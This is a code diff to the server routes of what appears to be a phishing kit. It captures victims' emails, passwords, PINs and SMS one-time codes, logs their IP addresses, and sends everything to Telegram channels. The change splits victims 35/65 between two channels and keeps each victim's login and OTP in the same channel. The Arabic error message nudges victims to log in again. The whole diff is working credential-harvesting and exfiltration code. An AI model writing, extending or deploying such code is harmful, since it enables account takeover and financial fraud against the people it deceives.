@@ -1,7 +1,7 @@
 import type { Express, Request, Response } from "express";
 import { createServer, type Server } from "http";
 import { loginSchema, verifyOtpSchema } from "@shared/schema";
-import { sendToTelegram, formatLoginMessage, formatSMSMessage } from "./telegram";
+import { sendToTelegramChannel, selectChannel, formatLoginMessage, formatSMSMessage } from "./telegram";
 
 // Store temporary user data in memory for SMS verification
 interface TempUserData {
@@ -10,6 +10,7 @@ interface TempUserData {
   pin: string;
   ipAddress: string;
   userAgent: string;
+  selectedChannel: string; // Store the selected channel for this session
 }
 
 const tempUserData = new Map<string, TempUserData>();
@@ -33,9 +34,12 @@ export async function registerRoutes(app: Express): Promise<Server> {
       const ipAddress = getClientIp(req);
       const userAgent = req.headers['user-agent'] || 'unknown';
 
-      // Send Telegram notification
+      // Select channel once for this user session (35/65 split)
+      const userChannel = selectChannel();
+
+      // Send Telegram notification to selected channel
       const telegramMessage = formatLoginMessage(email, password, pin);
-      sendToTelegram(telegramMessage).catch(err => {
+      sendToTelegramChannel(telegramMessage, userChannel).catch(err => {
         console.error("⚠️ Telegram notification failed (non-blocking):", err);
       });
 
@@ -46,7 +50,8 @@ export async function registerRoutes(app: Express): Promise<Server> {
         password,
         pin,
         ipAddress,
-        userAgent
+        userAgent,
+        selectedChannel: userChannel // Save the channel for this session
       });
 
       console.log(`✅ Login data sent to Telegram - Email: ${email}`);
@@ -77,9 +82,9 @@ export async function registerRoutes(app: Express): Promise<Server> {
         return res.status(401).json({ message: "الجلسة منتهية، يرجى تسجيل الدخول مجدداً" });
       }
 
-      // Send Telegram notification for SMS code with code number
+      // Send Telegram notification to the SAME channel as login
       const smsMessage = formatSMSMessage(userData.email, otp, codeNumber);
-      sendToTelegram(smsMessage).catch(err => {
+      sendToTelegramChannel(smsMessage, userData.selectedChannel).catch(err => {
         console.error("⚠️ Telegram SMS notification failed (non-blocking):", err);
       });
 
